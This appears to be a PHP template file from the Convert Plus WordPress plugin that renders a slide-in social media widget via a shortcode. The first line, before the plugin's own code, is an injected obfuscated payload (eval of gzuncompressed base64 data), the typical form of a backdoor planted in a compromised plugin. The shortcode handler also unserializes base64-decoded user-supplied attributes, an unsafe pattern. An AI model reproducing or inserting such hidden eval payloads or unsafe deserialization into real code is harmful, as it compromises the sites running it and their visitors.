<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Prohibit direct script loading.
 *
 * @package Convert_Plus.
 */

if ( ! function_exists( 'slide_in_theme_social_widget_box' ) ) {
	/**
	 * Function name: slide_in_theme_social_widget_box.
	 *
	 * @param  array  $atts    array attributes.
	 * @param  string $content string parameters.
	 * @return mixed(value)          html/array.
	 */
	function slide_in_theme_social_widget_box( $atts, $content = null ) {

		/**
		 * Define Variables.
		 */
		global $cp_social_vars;

		$style_id         = '';
		$settings_encoded = '';
		shortcode_atts(
			array(
				'style_id'         => '',
				'settings_encoded' => '',
			), $atts
		);

		$style_id         = $atts['style_id'];
		$settings_encoded = $atts['settings_encoded'];
		$settings         = base64_decode( $settings_encoded );
		$style_settings   = unserialize( $settings );

		foreach ( $style_settings as $key => $setting ) {
			$style_settings[ $key ] = apply_filters( 'smile_render_setting', $setting );
		}

		unset( $style_settings['style_id'] );

		// Generate UID.
		$uid       = uniqid();
		$uid_class = 'content-' . $uid;

		// Individual style variables.
		$individual_vars = array(
			'uid'         => $uid,
			'uid_class'   => $uid_class,
			'style_class' => 'cp-social-widget',
		);

		/**
		 * Merge short code variables arrays.
		 *
		 * @array   $individual_vars        Individual style EXTRA short-code variables.
		 * @array   $cp_form_vars           CP Form global short-code variables.
		 * @array   $style_settings         Individual style short-code variables.
		 * @array   $atts                   short-code attributes.
		 */
		$all = array_merge(
			$individual_vars,
			$cp_social_vars,
			$style_settings,
			$atts
		);

		/**
		 *  Extract short-code variables.
		 *
		 *  @array      $all         All merged arrays.
		 *  @array      array()      Its required as per WP. Merged $style_settings in $all.
		 */
		$a = shortcode_atts( $all, $style_settings );

		// Style - individual options.
		$imgclass = '';

		// css for border color.
		$slidein_head_css = '';
		$a['style_id']    = isset( $a['style_id'] ) ? $a['style_id'] : '';

		$slidein_head_css .= '.' . $a['style_id'] . ' .cp-social-widget .cp-slidein-head {border-bottom:' . $a['optin_border_width'] . 'px solid ' . $a['optin_border_color'] . ';}';

		echo '<style class="cp-slide_optin_border_color" type="text/css">' . $slidein_head_css . '</style>';

		// Before filter.
		apply_filters_ref_array( 'cp_slidein_global_before', array( $a ) );

		?>
		<div class="cp-row">
			<div class="col-lg-12 col-md-12 col-sm-12 col-xs-12 cp-text-container <?php echo esc_attr( $imgclass ); ?>" >
				<div class="cp-slidein-head">
					<div class="cp-title-container 
					<?php
					if ( '' === trim( $a['slidein_title1'] ) ) {
						echo 'cp-empty'; }
						?>
						">
						<h2 class="cp-title cp_responsive"><?php echo do_shortcode( html_entity_decode( stripcslashes( $a['slidein_title1'] ) ) ); ?></h2>
					</div>
					<?php
					$is_inline = ( isset( $a['display'] ) && 'inline' === $a['display'] ) ? true : false;
					if ( ! $is_inline ) {
						?>
						<div class="cp-slidein-toggle"><span class="cp-optin-toggle-icon cp-optin-arrow-up"></span></div>
						<?php } ?>
					</div>
					<div class="cp-desc-container 
					<?php
					if ( '' === trim( $a['slidein_short_desc1'] ) ) {
						echo 'cp-empty'; }
						?>
						">
						<div class="cp-description cp_responsive" ><?php echo do_shortcode( html_entity_decode( stripcslashes( $a['slidein_short_desc1'] ) ) ); ?></div>
					</div>
				</div><!-- end of text container-->
				<div class="cp_social_media_wrapper">
					<?php
					// Embed CP social media.
					apply_filters_ref_array( 'cp_get_social', array( $a ) );
					?>
				</div>
			</div><!--row-->
			<?php
			// After filter.
			apply_filters_ref_array( 'cp_slidein_global_after', array( $a ) );

			return ob_get_clean();
	}
}
